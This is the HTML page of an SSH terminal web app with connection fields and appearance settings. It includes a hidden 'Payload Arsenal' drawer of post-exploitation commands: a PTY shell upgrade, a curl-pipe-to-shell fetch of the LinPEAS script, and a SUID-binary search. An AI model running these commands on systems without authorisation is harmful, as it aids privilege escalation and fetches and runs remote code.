<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="stylesheet" href="/src/styles.css" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Multiterm SSH</title>
    <script type="module" src="/src/main.ts" defer></script>
  </head>
  <body>
    <div id="app-container">
      <div id="ssh-header">
        <input type="text" id="ssh-user" placeholder="User" />
        <span class="at-symbol">@</span>
        <input type="text" id="ssh-host" placeholder="Host" />
        <input type="number" id="ssh-port" placeholder="Port" value="22" />
        <input type="password" id="ssh-pass" placeholder="Password" />
        <button id="ssh-connect-btn">Connect</button>
        <button id="settings-toggle-btn" title="Open Settings">⚙️</button>
      </div>
      <div id="terminal-container"></div>
      <div id="payload-drawer" class="hidden">
        <h3>Payload Arsenal</h3>
        <ul>
          <li data-payload="python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'">Python TTY Upgrade</li>
          <li data-payload="curl -L http://linpeas.sh | sh">LinPEAS</li>
          <li data-payload="find / -perm -u=s -type f 2>/dev/null">Find SUID Binaries</li>
        </ul>
      </div>
      <div id="settings-modal" class="hidden">
        <div class="settings-modal-content">
          <div class="settings-header">
            <h3>Settings</h3>
            <button id="close-settings-btn">&times;</button>
          </div>
          <div class="settings-body">
            <div class="settings-sidebar">
              <button class="tab-btn active" data-tab="appearance">Appearance</button>
              <button class="tab-btn" data-tab="behavior">Behavior</button>
            </div>
            <div class="settings-panels">
              <!-- Appearance Tab -->
              <div class="tab-panel active" id="tab-appearance">
                <div class="setting-group">
                  <label for="font-family">Font Family</label>
                  <input type="text" id="font-family" value='"Fira Code", Consolas, "Courier New", monospace' />
                </div>
                <div class="setting-group">
                  <label for="font-size">Font Size</label>
                  <input type="number" id="font-size" value="14" min="8" max="48" />
                </div>
                <div class="setting-group">
                  <label for="bg-color">Background Color</label>
                  <input type="color" id="bg-color" value="#1e1e1e" />
                </div>
                <div class="setting-group">
                  <label for="fg-color">Foreground Color</label>
                  <input type="color" id="fg-color" value="#f6f6f6" />
                </div>
                <div class="setting-group">
                  <label for="cursor-style">Cursor Style</label>
                  <select id="cursor-style">
                    <option value="block">Block</option>
                    <option value="underline">Underline</option>
                    <option value="bar">Bar</option>
                  </select>
                </div>
              </div>

              <!-- Behavior Tab -->
              <div class="tab-panel" id="tab-behavior">
                <div class="setting-group checkbox-group">
                  <label for="cursor-blink">Cursor Blink</label>
                  <input type="checkbox" id="cursor-blink" checked />
                </div>
                <div class="setting-group">
                  <label for="scrollback">Scrollback Lines</label>
                  <input type="number" id="scrollback" value="10000" min="100" max="100000" />
                </div>
                <div class="setting-group checkbox-group">
                  <label for="right-click-select">Right Click Selects Word</label>
                  <input type="checkbox" id="right-click-select" checked />
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
